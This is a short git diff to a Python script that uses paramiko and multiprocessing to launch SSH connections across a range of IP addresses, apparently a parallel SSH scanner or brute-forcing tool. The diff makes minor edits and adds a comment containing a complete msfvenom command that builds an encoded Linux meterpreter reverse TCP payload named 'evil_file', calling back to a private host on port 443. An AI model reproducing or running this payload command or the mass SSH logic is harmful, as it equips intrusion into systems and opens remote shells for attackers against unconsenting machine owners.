@@ -1,6 +1,5 @@
 import paramiko
 import multiprocessing
-import time
 import warnings
 
 # remove depracated warnings
@@ -43,6 +42,8 @@ for i in range(150,155):
             p = multiprocessing.Process(target=ssh_start)
             jobs.append(p)
             p.start()
-            # p.join()
+            # p.join()	# Slow Version
             num2 += 1
-    num += 1
+        num += 1
+
+# msfvenom --payload linux/x86/meterpreter_reverse_tcp LPORT=443 LHOST=192.168.203.1 -e shikata_ga_nai -f elf -a x86 -o evil_file
